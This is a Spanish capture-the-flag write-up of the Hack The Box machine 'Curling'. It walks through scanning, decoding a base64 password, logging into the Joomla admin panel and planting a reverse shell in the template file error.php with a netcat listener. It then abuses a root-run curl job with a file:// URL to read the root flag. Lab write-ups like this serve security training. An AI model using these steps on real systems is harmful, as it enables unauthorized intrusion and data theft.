---
description: '✍️ Autor: l4mje🔍 Dificultad: Fácil 📅 Fecha de creación: 08/05/2019'
---

# Curling

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.10.150
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sC -sV 10.10.10.150
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Durante el escaneo se identificaron los siguientes puertos abiertos:

* **Puerto 22 (SSH):** El puerto 22 está abierto y ejecutando OpenSSH 7.6p1 en un sistema Ubuntu Linux. Se han detectado las claves del host en los algoritmos RSA, ECDSA y ED25519, lo que indica que el sistema permite conexiones seguras mediante SSH.
* **Puerto 80 (HTTP):** El puerto 80 se encuentra abierto y ejecuta un servidor web Apache 2.4.29 en Ubuntu. Se ha detectado que el sitio utiliza Joomla! como sistema de gestión de contenidos (CMS), lo que podría ser un posible vector de ataque si existen vulnerabilidades conocidas en la versión instalada.

A continuación, se procederá a analizar cada uno de estos servicios en busca de posibles vectores de ataque.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 10.10.10.150
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay dos usuarios posibles **Super User** y **Floris**. Revisando el código fuente encontramos una línea comentada.

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisando el directorio nos encontramos una contraseña puede ser codificada en **base64**.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
echo "Q3VybGluZzIwMTgh" | base64 --decode
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Escaneo para ver los directorios.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.10.150/FUZZ
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un directorio que nos llama la atención llamado `/administrator`.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con las credenciales obtenidas anteriormente.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

{% embed url="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html" %}

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En **error.php** subimos una Reverse Shell. Nos ponemos en escucha.

```
http://10.10.10.150/templates/protostar/error.php
nc -nlvp 4444
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Mejoramos la TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

No tenemos permiso para leer la flag del user. Puedo acceder al archivo `password_backup`, que parece un archivo de volcado en formato hexadecimal. El tipo de archivo es ASCII.

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usando CyberChef, podemos cargar el archivo `password_backup` para procesarlo (para procesar el volcado hexadecimal, haz clic en la varita mágica junto a 'output').

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahí está la contraseña por lo que iniciamos sesión.

```
ssh floris@10.10.10.151
```

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos SUDO.

Descubrimos un proceso automatizado en el directorio `admin-area` que recupera datos desde una URL especificada en un archivo de entrada y almacena la salida en un archivo de reporte. Sospechamos que este proceso es ejecutado por un script que utiliza el comando `curl`, y dado que los archivos son propiedad de `root`, planteamos la posibilidad de acceder a archivos restringidos.

Tras investigar un poco, nuestra siguiente estrategia será modificar la ruta `file:///<path>/`. Primero, editaremos el archivo de entrada para que ejecute un archivo local y permitiremos que `curl` lo procese.

```bash
echo 'url = "file:///root/root.txt"' > input
cat report
```

Ya leemos así la flag.

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
